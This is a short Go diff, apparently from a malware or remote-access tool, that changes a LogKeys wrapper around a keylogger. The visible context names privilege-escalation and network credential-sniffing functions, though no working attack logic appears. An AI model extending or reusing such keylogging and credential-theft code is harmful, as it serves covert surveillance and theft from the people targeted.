@@ -192,8 +192,8 @@ func Escalate(path string) string {
 	return _err.Error()
 }
 
-func LogKeys(logLocal *string) {
-	Keylogger(logLocal)
+func LogKeys() {
+	startLogger(0)
 }
 
 // CredentialsSniff is used to sniff network traffic for
